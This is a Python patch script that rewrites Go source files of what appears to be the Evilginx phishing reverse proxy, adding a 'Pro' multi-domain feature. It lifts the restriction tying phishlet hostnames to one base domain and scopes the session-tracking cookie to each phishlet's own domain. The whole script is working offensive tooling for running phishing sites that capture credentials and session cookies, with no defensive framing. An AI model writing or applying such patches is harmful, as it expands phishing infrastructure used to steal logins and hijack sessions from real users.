#!/usr/bin/env python3
# patch_multidomain.py — Pro-feature #8: multi-domain support.
# CE locks every phishlet hostname to the single base domain. Allow each
# phishlet to use its own domain, and bind the session tracking cookie to
# the phishlet's domain instead of the global base domain.
import sys

def patch(path, old, new):
    src = open(path, "r", encoding="utf-8").read()
    n = src.count(old)
    if n != 1:
        sys.exit(f"[abort] {path}: pattern found {n}x (need exactly 1):\n{old[:140]}")
    open(path, "w", encoding="utf-8").write(src.replace(old, new))
    print(f"[patch] {path} OK")

# 1) SetSiteHostname — accept any dotted hostname (per-phishlet domain)
patch("core/config.go",
      '\tif hostname != "" && hostname != c.general.Domain && !strings.HasSuffix(hostname, "."+c.general.Domain) {\n'
      '\t\tlog.Error("phishlet hostname must end with \'%s\'", c.general.Domain)\n'
      '\t\treturn false\n'
      '\t}',
      '\tif hostname != "" && !strings.Contains(hostname, ".") {\n'
      '\t\tlog.Error("phishlet hostname must be a valid domain name")\n'
      '\t\treturn false\n'
      '\t}')

# 2) Config.GetPhishletCookieDomain — helper next to GetSiteDomain
patch("core/config.go",
      "func (c *Config) GetSiteDomain(site string) (string, bool) {\n"
      "\tif o, ok := c.phishletConfig[site]; ok {\n"
      "\t\treturn o.Hostname, ok\n"
      "\t}\n"
      '\treturn "", false\n'
      "}",
      "func (c *Config) GetSiteDomain(site string) (string, bool) {\n"
      "\tif o, ok := c.phishletConfig[site]; ok {\n"
      "\t\treturn o.Hostname, ok\n"
      "\t}\n"
      '\treturn "", false\n'
      "}\n"
      "\n"
      "func (c *Config) GetPhishletCookieDomain(site string) string {\n"
      "\tif o, ok := c.phishletConfig[site]; ok && o.Hostname != \"\" {\n"
      "\t\treturn o.Hostname\n"
      "\t}\n"
      "\treturn c.general.Domain\n"
      "}")

# 3) session tracking cookie follows the phishlet's own domain
patch("core/http_proxy.go",
      "\t\t\t\t\tDomain:  p.cfg.GetBaseDomain(),",
      "\t\t\t\t\tDomain:  p.cfg.GetPhishletCookieDomain(ps.PhishletName),")

print("[done] multi-domain patches applied")
